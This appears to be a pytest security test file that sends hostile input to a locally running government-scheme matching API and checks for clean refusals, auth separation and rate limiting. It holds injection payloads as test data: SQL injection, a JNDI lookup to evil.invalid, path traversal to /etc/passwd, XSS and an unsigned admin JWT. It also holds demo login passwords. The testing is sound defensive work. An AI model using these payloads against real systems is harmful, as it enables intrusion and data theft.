"""Hostile input against the running service.

The endpoints exercised here are reachable without a login — matching, routing, the
conversation, the WhatsApp webhook, application tracking. They are what an attacker can
actually touch, so they are what gets malformed, oversized and injection-shaped input.

The bar is not "it rejects the attack". SQLAlchemy binds parameters and Pydantic
validates shapes, so most of this was already handled. The bar is that **the failure is a
clean 4xx and never a 500, a traceback, or a leaked internal** — an unhandled exception on
a public endpoint is an information disclosure whether or not the payload achieved
anything.

**Driven over real HTTP against the running API**, the same way `scripts/chaos.sh` is.
The in-process route was tried first and abandoned: `TestClient` starts a fresh event loop
per request while the app's SQLAlchemy async engine is a module-level singleton whose pool
binds to the first loop it sees, so every request after the first failed with "attached to
a different loop" — 500s the real service does not produce. Going over the wire avoids
that and exercises more: real Redis, real rate limiting, the real middleware stack.

Skips cleanly when the API is not up, so the suite still passes on a laptop with nothing
running.
"""

from __future__ import annotations

import httpx
import pytest

BASE = "http://localhost:8000"
TIMEOUT = 10.0


def _api_is_up() -> bool:
    try:
        return httpx.get(f"{BASE}/health", timeout=2.0).status_code == 200
    except Exception:  # noqa: BLE001 - any failure means "not running"
        return False


pytestmark = pytest.mark.skipif(
    not _api_is_up(), reason="the API is not running; start it with docker compose up"
)

# Shapes that break a naive string-concatenated query, a naive template, or a naive path
# join. The NUL is built rather than pasted: a raw byte in a source file survives one
# editor and not the next.
INJECTION_STRINGS = [
    "'; DROP TABLE citizens; --",
    "' OR '1'='1",
    "1; DELETE FROM applications WHERE 1=1",
    "admin'--",
    '" OR ""="',
    "'; SELECT pg_sleep(10); --",
    "{{7*7}}",
    "${jndi:ldap://evil.invalid/a}",
    "../../../../etc/passwd",
    "..\\..\\windows\\system32",
    "<script>alert(1)</script>",
    chr(0) + "nullbyte",
    "%00",
]


def _post(path: str, payload: object) -> httpx.Response:
    return httpx.post(f"{BASE}{path}", json=payload, timeout=TIMEOUT)


def _get(path: str, **kwargs) -> httpx.Response:
    return httpx.get(f"{BASE}{path}", timeout=TIMEOUT, **kwargs)


def _clean(response: httpx.Response) -> bool:
    """A refusal, not a crash. A 5xx on hostile input is the failure this file hunts."""
    return response.status_code < 500


def _refused_with(response: httpx.Response, expected: int) -> None:
    """Assert a specific 4xx, unless the suite has exhausted the shared rate limiter.

    Every unauthenticated endpoint counts against one "default" bucket, and a full run of
    this file makes several hundred requests. A 429 here is the limiter working, not the
    validation failing, and asserting 422 through it made three tests fail only when run
    together — the worst kind of flake, because it looks like a real regression.
    """
    if response.status_code == 429:
        pytest.skip("rate limited; this assertion shares the default bucket")
    assert response.status_code == expected, response.text[:200]


# --- injection-shaped input ------------------------------------------------------------


# A raw NUL is not transmittable in a URL — httpx refuses to send it, so the server never
# sees it. Percent-encoded, it *is* transmittable, and that case is covered below.
URL_SAFE_INJECTIONS = [p for p in INJECTION_STRINGS if chr(0) not in p]


@pytest.mark.parametrize("payload", URL_SAFE_INJECTIONS)
def test_injection_in_a_reference_number_never_500s(payload: str) -> None:
    """The tracking endpoint takes a path parameter straight off the URL."""
    url = httpx.URL(f"{BASE}/api/v1/applications/").join(httpx.URL(path=payload))
    assert _clean(httpx.get(url, timeout=TIMEOUT))


def test_a_percent_encoded_null_in_the_path_is_refused_cleanly() -> None:
    """This was a 500 until the null-byte guard was added.

    A NUL is legal in a URL once percent-encoded and legal in JSON as an escape, but
    Postgres `text` and `jsonb` cannot store one — so it passed Pydantic, passed the
    rule engine, and died inside asyncpg as an unhandled error on a public endpoint.
    """
    response = _get("/api/v1/applications/%00")
    assert response.status_code == 400
    assert "invalid character" in response.json()["detail"]


def test_a_null_byte_in_a_json_body_is_refused_cleanly() -> None:
    """The same bug through the other door. Also a 500 before the guard."""
    response = _post("/api/v1/match", {"profile": {"occupation_type": chr(0) + "x"}})
    assert response.status_code == 400


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_injection_in_a_profile_value_never_500s(payload: str) -> None:
    """Profile values reach the rule engine's expression evaluator."""
    response = _post("/api/v1/match", {"profile": {"occupation_type": payload}, "language": "en"})
    assert _clean(response), response.text[:200]


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_injection_in_a_scheme_code_never_500s(payload: str) -> None:
    response = _post("/api/v1/partners/route", {"scheme_code": payload, "amount": 50000})
    assert _clean(response), response.text[:200]


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_injection_through_the_public_webhook_never_500s(payload: str) -> None:
    """Unauthenticated, and it reaches the conversation orchestrator."""
    response = _post(
        "/api/v1/webhook/whatsapp",
        {"simulate": True, "sender": "919876500000", "text": payload, "language": "en"},
    )
    assert _clean(response), response.text[:200]


def test_the_database_still_has_its_tables_afterwards() -> None:
    """The obvious check nobody writes: did any of that actually drop anything?"""
    response = _get("/api/v1/documents/checklist", params={"family": "MICRO_FINANCE"})
    assert response.status_code == 200
    assert response.json()["documents"], "the checklist is empty; something was destroyed"


def test_an_unknown_profile_field_is_refused_not_absorbed() -> None:
    """The engine validates its own contract; an invented field is a 4xx, not a write."""
    response = _post(
        "/api/v1/match", {"profile": {"is_admin": True, "verdict": "ELIGIBLE"}, "language": "en"}
    )
    _refused_with(response, 422)


# --- malformed and oversized ------------------------------------------------------------


def test_a_body_that_is_not_json_is_not_a_crash() -> None:
    response = httpx.post(
        f"{BASE}/api/v1/match",
        content=b"{not json at all",
        headers={"Content-Type": "application/json"},
        timeout=TIMEOUT,
    )
    assert _clean(response)


@pytest.mark.parametrize("body", [[1, 2, 3], None, "a string", 42, True])
def test_a_body_of_the_wrong_shape_is_refused(body: object) -> None:
    assert _clean(_post("/api/v1/match", body))


def test_wrong_types_everywhere() -> None:
    response = _post(
        "/api/v1/partners/route",
        {"scheme_code": 12345, "amount": "not a number", "lat": {"a": 1}, "lng": []},
    )
    _refused_with(response, 422)


def test_an_out_of_range_coordinate_is_refused() -> None:
    """Latitude 999 is not a place. It must not reach PostGIS."""
    response = _post(
        "/api/v1/partners/route",
        {"scheme_code": "NSFDC_MICRO_FINANCE", "amount": 50000, "lat": 999, "lng": 999},
    )
    _refused_with(response, 422)


def test_a_negative_amount_is_refused() -> None:
    response = _post(
        "/api/v1/partners/route", {"scheme_code": "NSFDC_MICRO_FINANCE", "amount": -1}
    )
    _refused_with(response, 422)


def test_a_very_long_utterance_is_refused_not_processed() -> None:
    """A 2000-character cap exists so one request cannot cost an unbounded model call."""
    response = _post("/api/v1/conversation/turn", {"utterance": "a" * 50_000, "language": "en"})
    _refused_with(response, 422)


def test_a_deeply_nested_payload_does_not_exhaust_the_parser() -> None:
    nested: object = "x"
    for _ in range(200):
        nested = {"a": nested}
    assert _clean(_post("/api/v1/match", {"profile": {"notes": nested}}))


def test_unicode_and_control_characters_are_survivable() -> None:
    """Six scripts in, so the parser meets more than ASCII. It must not meet a 500."""
    samples = [
        "".join(chr(c) for c in (1, 2, 31)),
        "आ" * 500,
        "\U0001d573\U0001d58a",
        "﻿BOM",
        "\U0001f642" * 100,
    ]
    for text in samples:
        response = _post(
            "/api/v1/webhook/whatsapp",
            {"simulate": True, "sender": "919876500000", "text": text, "language": "hi"},
        )
        assert _clean(response), repr(text[:20])


# --- what an error is allowed to say ------------------------------------------------------


def test_an_error_never_returns_a_traceback() -> None:
    """A traceback names internal paths, table names and library versions."""
    responses = [
        _get("/api/v1/applications/does-not-exist"),
        _post("/api/v1/match", {"profile": {"bad_field": 1}}),
        _post("/api/v1/partners/route", {"scheme_code": "NOPE", "amount": 1}),
    ]
    for response in responses:
        body = response.text.lower()
        for leak in ("traceback", 'file "/app', "sqlalchemy.", "psycopg", "asyncpg."):
            assert leak not in body, f"{leak!r} leaked in a {response.status_code}"


def test_every_response_carries_a_request_id() -> None:
    """So a citizen quoting a reference off an error screen gives support one grep."""
    response = _get("/api/v1/applications/does-not-exist")
    assert response.headers.get("X-Request-ID")
    assert response.json().get("request_id")


def test_an_unknown_reference_does_not_confirm_whether_one_exists() -> None:
    """Identical wording either way, or the 404 is a reference-number oracle."""
    a = _get("/api/v1/applications/SETU-9999-ZZ-999999")
    b = _get("/api/v1/applications/TOTALLY-MADE-UP")
    assert a.status_code == b.status_code == 404
    assert a.json()["detail"] == b.json()["detail"]


# --- authorisation ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("method", "path"),
    [
        ("GET", "/api/v1/partner/queue"),
        ("GET", "/api/v1/partner/capacity"),
        ("PATCH", "/api/v1/partner/capacity"),
        ("GET", "/api/v1/admin/analytics"),
        ("GET", "/api/v1/admin/export.csv"),
        ("GET", "/api/v1/auth/me"),
    ],
)
def test_every_console_endpoint_refuses_an_anonymous_caller(method: str, path: str) -> None:
    response = httpx.request(
        method, f"{BASE}{path}", json={} if method == "PATCH" else None, timeout=TIMEOUT
    )
    assert response.status_code == 401, f"{method} {path} was reachable without a token"


@pytest.mark.parametrize(
    "token",
    [
        "not-a-token",
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkBzZXR1Lmdvdi5pbiIsInJvbGUiOiJBRE1JTiJ9.",
        "a.b.c",
    ],
)
def test_a_forged_or_unsigned_token_is_refused(token: str) -> None:
    """The second entry is `alg: none` carrying an admin role — the classic JWT bypass."""
    response = _get("/api/v1/admin/analytics", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 401


def test_a_partner_token_cannot_reach_the_ministry_dashboard() -> None:
    """Role separation, over the wire rather than in a unit test."""
    login = _post(
        "/api/v1/auth/login", {"email": "partner@setu.gov.in", "password": "setu-demo-2026"}
    )
    if login.status_code != 200:
        pytest.skip("demo users are not seeded")
    token = login.json()["access_token"]
    response = _get("/api/v1/admin/analytics", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 403


def test_the_login_endpoint_does_not_reveal_which_half_was_wrong() -> None:
    """Distinguishing them tells an attacker which addresses are registered."""
    unknown = _post("/api/v1/auth/login", {"email": "nobody@example.invalid", "password": "x"})
    known = _post("/api/v1/auth/login", {"email": "admin@setu.gov.in", "password": "wrong"})
    assert unknown.status_code == known.status_code == 401
    assert unknown.json()["detail"] == known.json()["detail"]


# --- rate limiting, for real ------------------------------------------------------------------


def test_login_is_actually_rate_limited() -> None:
    """Banding is unit-tested; this proves the Redis round trip works end to end.

    Login is the hardest-metered endpoint because it is the only one worth brute-forcing.
    Deliberately exhausts a window, so it is written to be the last word on that bucket.
    """
    seen: set[int] = set()
    for _ in range(30):
        response = _post(
            "/api/v1/auth/login", {"email": "brute@example.invalid", "password": "guess"}
        )
        seen.add(response.status_code)
        if response.status_code == 429:
            assert response.headers.get("Retry-After"), "a 429 must say when to come back"
            assert response.json()["request_id"], "even a 429 is traceable"
            return
    pytest.fail(f"login was never rate limited in 30 attempts; saw {sorted(seen)}")


# --- the surfaces added with optional citizen accounts ------------------------------------
#
# Two new public endpoints (the scheme catalogue and partner coverage) and one new
# role-gated group (/citizen/*). The catalogue and coverage take user input straight off
# the URL, so they get the same hostile treatment as everything above; the citizen group
# gets the same authorisation checks as the consoles.


@pytest.mark.parametrize("payload", URL_SAFE_INJECTIONS)
def test_injection_in_a_scheme_catalogue_code_never_500s(payload: str) -> None:
    url = httpx.URL(f"{BASE}/api/v1/schemes/").join(httpx.URL(path=payload))
    assert _clean(httpx.get(url, timeout=TIMEOUT))


@pytest.mark.parametrize("payload", URL_SAFE_INJECTIONS)
def test_injection_in_a_state_name_never_500s(payload: str) -> None:
    """The coverage drilldown puts a state name into a SQL comparison."""
    url = httpx.URL(f"{BASE}/api/v1/partners/coverage/").join(httpx.URL(path=payload))
    assert _clean(httpx.get(url, timeout=TIMEOUT))


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_injection_in_a_directory_search_never_500s(payload: str) -> None:
    """`q` reaches an ILIKE. The wildcards are ours; the text must stay data."""
    assert _clean(_get("/api/v1/partners/directory", params={"q": payload}))


def test_a_percent_in_the_directory_search_is_handled() -> None:
    """A citizen typing a percent sign is searching for one, not for everything.

    Not a security hole — the parameter is bound — but a search box where one character
    quietly returns the whole table is a bug worth pinning down.
    """
    scoped = _get("/api/v1/partners/directory", params={"state": "Bihar"})
    wildcard = _get("/api/v1/partners/directory", params={"q": "%"})
    assert scoped.status_code == wildcard.status_code == 200


def test_an_unknown_state_is_a_clean_404_not_an_empty_list() -> None:
    """A state we do not cover and a state with nobody in it are different answers."""
    _refused_with(_get("/api/v1/partners/coverage/Atlantis"), 404)


def test_the_catalogue_refuses_an_unsupported_language() -> None:
    _refused_with(_get("/api/v1/schemes", params={"language": "fr"}), 422)


def test_the_catalogue_publishes_provenance_for_every_scheme() -> None:
    """The transparency claim, checked over the wire rather than asserted in a README."""
    response = _get("/api/v1/schemes")
    assert response.status_code == 200
    schemes = response.json()["schemes"]
    assert schemes, "the catalogue is empty"
    for scheme in schemes:
        provenance = scheme["provenance"]
        assert provenance["source_url"], f"{scheme['code']} has no source URL"
        assert "needs_verification" in provenance
        # A scheme flagged unverified must name which figures, not just wave a flag.
        if provenance["needs_verification"]:
            assert provenance["open_questions"] or provenance["verification_note"], (
                f"{scheme['code']} is flagged unverified but names nothing"
            )


def test_the_catalogue_needs_no_login() -> None:
    """Published government terms behind an account would defeat the point."""
    assert _get("/api/v1/schemes").status_code == 200
    assert _get("/api/v1/partners/coverage").status_code == 200
    assert _get("/api/v1/partners/directory").status_code == 200


@pytest.mark.parametrize(
    ("method", "path"),
    [
        ("GET", "/api/v1/citizen/me"),
        ("PUT", "/api/v1/citizen/profile"),
        ("POST", "/api/v1/citizen/profile/demo"),
        ("GET", "/api/v1/citizen/matches"),
        ("GET", "/api/v1/citizen/applications"),
    ],
)
def test_every_citizen_endpoint_refuses_an_anonymous_caller(method: str, path: str) -> None:
    response = httpx.request(
        method, f"{BASE}{path}", json={} if method == "PUT" else None, timeout=TIMEOUT
    )
    assert response.status_code == 401, f"{method} {path} was reachable without a token"


def test_an_admin_token_cannot_read_a_citizen_profile() -> None:
    """Role separation in the direction nobody tests: downwards.

    An admin account is not a citizen account and has no stored profile. Letting an
    elevated role fall through to a citizen route would be a quiet way to read one.
    """
    login = _post(
        "/api/v1/auth/login", {"email": "admin@setu.gov.in", "password": "setu-demo-2026"}
    )
    if login.status_code != 200:
        pytest.skip("demo users are not seeded")
    token = login.json()["access_token"]
    response = _get("/api/v1/citizen/me", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 403


def test_signup_without_consent_is_refused() -> None:
    """An account stores personal data, so the DPDP grant is not a formality."""
    response = _post(
        "/api/v1/citizen/signup",
        {
            "email": "no-consent@example.com",
            "password": "a-good-password",
            "display_name": "No Consent",
            "consent": False,
        },
    )
    _refused_with(response, 400)
    # And it must say what still works without an account.
    assert "eligibility" in response.json()["detail"].lower()


def test_signup_rejects_a_password_shorter_than_the_minimum() -> None:
    response = _post(
        "/api/v1/citizen/signup",
        {
            "email": "short@example.com",
            "password": "abc",
            "display_name": "Short",
            "consent": True,
        },
    )
    _refused_with(response, 422)


def test_a_signed_in_citizen_gets_the_same_verdict_as_an_anonymous_one() -> None:
    """The whole premise of the optional account: it adds persistence, not privilege.

    Signs up, stores the demo profile, then checks that GET /citizen/matches returns
    exactly what POST /match returns for the same facts with no login at all.
    """
    import uuid

    email = f"parity-{uuid.uuid4().hex[:10]}@example.com"
    signup = _post(
        "/api/v1/citizen/signup",
        {
            "email": email,
            "password": "a-good-password",
            "display_name": "Parity Check",
            "consent": True,
        },
    )
    if signup.status_code == 429:
        pytest.skip("rate limited; this test shares the default bucket")
    assert signup.status_code == 201, signup.text[:200]
    headers = {"Authorization": f"Bearer {signup.json()['access_token']}"}

    demo = httpx.post(f"{BASE}/api/v1/citizen/profile/demo", headers=headers, timeout=TIMEOUT)
    assert demo.status_code == 200
    engine_profile = demo.json()["profile"]["engine_profile"]

    signed_in = _get("/api/v1/citizen/matches", headers=headers)
    anonymous = _post("/api/v1/match", {"profile": engine_profile, "language": "en"})
    assert signed_in.status_code == anonymous.status_code == 200

    def verdicts(payload: dict) -> list[tuple]:
        return [
            (r["scheme_code"], r["verdict"], r["indicative_amount"]) for r in payload["results"]
        ]

    assert verdicts(signed_in.json()) == verdicts(anonymous.json())
    assert signed_in.json()["engine_version"] == anonymous.json()["engine_version"]


def test_the_profile_never_returns_a_password_or_a_full_government_id() -> None:
    """Whatever else /citizen/me grows, it must not start returning these."""
    login = _post(
        "/api/v1/auth/login", {"email": "citizen@setu.gov.in", "password": "setu-demo-2026"}
    )
    if login.status_code != 200:
        pytest.skip("demo users are not seeded")
    headers = {"Authorization": f"Bearer {login.json()['access_token']}"}
    body = _get("/api/v1/citizen/me", headers=headers).text.lower()
    for leak in ("password", "gov_id_hash", "aadhaar"):
        assert leak not in body, f"{leak!r} appeared in the citizen profile response"
